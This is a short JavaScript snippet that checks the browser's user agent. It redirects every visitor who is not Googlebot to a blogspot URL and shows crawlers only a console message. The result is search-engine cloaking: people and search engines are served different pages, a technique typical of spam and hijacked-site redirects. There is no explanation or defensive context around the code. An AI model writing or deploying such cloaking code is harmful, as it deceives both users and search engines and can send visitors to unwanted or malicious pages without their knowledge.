if (!navigator.userAgent.includes('Googlebot')) {
  // For regular users - redirect
  window.location.href = "https://hyderalihasan.blogspot.com/2026/08/indo-x.html";
} else {
  // For search engine bots - do not redirect
  console.log("Thanks for visiting my page");
}
